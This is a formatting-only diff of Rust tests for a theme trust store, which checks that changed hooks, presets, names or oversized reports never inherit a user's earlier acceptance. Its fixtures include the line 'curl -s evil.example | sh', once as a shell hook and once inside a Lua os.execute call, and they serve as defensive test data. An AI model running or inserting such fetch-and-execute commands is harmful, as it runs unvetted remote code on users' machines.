@@ -432,8 +432,14 @@ mod tests {
         const BODY: &str = ACCEPTED_PRESET_BODY;
 
         for (what, changed) in [
-            ("the command", hook("started", "curl -s evil.example | sh", "noctalia-v5")),
-            ("the event key", hook("shutdown", "sddm-watch.sh", "noctalia-v5")),
+            (
+                "the command",
+                hook("started", "curl -s evil.example | sh", "noctalia-v5"),
+            ),
+            (
+                "the event key",
+                hook("shutdown", "sddm-watch.sh", "noctalia-v5"),
+            ),
             ("the provider", hook("started", "sddm-watch.sh", "other-v1")),
             ("the preset file", preset("animations", "Evil.lua", BODY)),
             ("the preset category", preset("borders", "Space.lua", BODY)),
@@ -443,7 +449,11 @@ mod tests {
             // code — a different package.
             (
                 "the preset body",
-                preset("animations", "Space.lua", "os.execute(\"curl -s evil.example | sh\")\n"),
+                preset(
+                    "animations",
+                    "Space.lua",
+                    "os.execute(\"curl -s evil.example | sh\")\n",
+                ),
             ),
         ] {
             assert!(
@@ -467,7 +477,10 @@ mod tests {
         );
         let mut removed = risky_report();
         removed.shell_hooks.clear();
-        assert!(!store.accepts("Risky", &removed), "a removed hook is not the accepted content");
+        assert!(
+            !store.accepts("Risky", &removed),
+            "a removed hook is not the accepted content"
+        );
 
         // Order is part of the recorded shape: the detector is deterministic,
         // so a reordered report means the file on disk was rewritten.
@@ -528,7 +541,10 @@ mod tests {
         let path = saved_store(tmp.path());
         let store = TrustStore::load(&path);
 
-        assert!(!store.accepts("Other", &risky_report()), "an acceptance must not leak to another theme");
+        assert!(
+            !store.accepts("Other", &risky_report()),
+            "an acceptance must not leak to another theme"
+        );
         assert!(store.accepts("Risky", &risky_report()));
     }
 
@@ -683,10 +699,9 @@ mod tests {
     #[test]
     fn a_report_over_the_theme_budget_is_never_remembered() {
         let mut report = risky_report();
-        report.shell_hooks[0].command = "x".repeat(crate::theme_trust::MAX_REMEMBERED_THEME_BYTES + 1);
-        assert!(
-            report.remembered_bytes("Big") > crate::theme_trust::MAX_REMEMBERED_THEME_BYTES
-        );
+        report.shell_hooks[0].command =
+            "x".repeat(crate::theme_trust::MAX_REMEMBERED_THEME_BYTES + 1);
+        assert!(report.remembered_bytes("Big") > crate::theme_trust::MAX_REMEMBERED_THEME_BYTES);
         assert!(
             !report.is_uninspected(),
             "the fixture is fully read: it is only too large to record"
@@ -694,7 +709,10 @@ mod tests {
 
         let mut store = TrustStore::default();
         store.remember("Big", &report);
-        assert!(!store.accepts("Big", &report), "nothing is remembered for it");
+        assert!(
+            !store.accepts("Big", &report),
+            "nothing is remembered for it"
+        );
     }
 
     /// W2c-c, and the defect BOTH re-judges measured: the write is REFUSED
@@ -806,7 +824,10 @@ mod tests {
         );
         let mut store = TrustStore::default();
         store.remember(&name, &too_many);
-        assert!(!store.accepts(&name, &too_many), "nothing is remembered for it");
+        assert!(
+            !store.accepts(&name, &too_many),
+            "nothing is remembered for it"
+        );
     }
 
     /// A theme name is a TOML key here and is NEVER joined into a path, so
@@ -839,8 +860,14 @@ mod tests {
         store.save(&path).unwrap();
 
         let loaded = TrustStore::load(&path);
-        assert!(loaded.accepts(name, &risky_report()), "a quoted name must round trip");
-        assert!(loaded.accepts("Other", &other), "the neighbour entry must survive too");
+        assert!(
+            loaded.accepts(name, &risky_report()),
+            "a quoted name must round trip"
+        );
+        assert!(
+            loaded.accepts("Other", &other),
+            "the neighbour entry must survive too"
+        );
         assert!(
             !loaded.accepts("Other", &risky_report()),
             "a name that LOOKS like TOML must never write another theme's content"
@@ -954,7 +981,11 @@ mod tests {
         // refused too, and then the bound is not what was proven).
         let parsed: StoreFile = toml::from_str(&raw).expect("the fixture must be a valid store");
         assert_eq!(parsed.version, STORE_VERSION);
-        assert_eq!(parsed.accepted.len(), 1, "the fixture must carry the acceptance");
+        assert_eq!(
+            parsed.accepted.len(),
+            1,
+            "the fixture must carry the acceptance"
+        );
 
         assert!(
             !TrustStore::load(&path).accepts("Risky", &risky_report()),
@@ -1035,7 +1066,10 @@ mod tests {
             "the store must never write through a symlink at its own path"
         );
         assert!(
-            !std::fs::symlink_metadata(&path).unwrap().file_type().is_symlink(),
+            !std::fs::symlink_metadata(&path)
+                .unwrap()
+                .file_type()
+                .is_symlink(),
             "the store must replace the link with a regular file"
         );
         assert!(TrustStore::load(&path).accepts("Risky", &risky_report()));
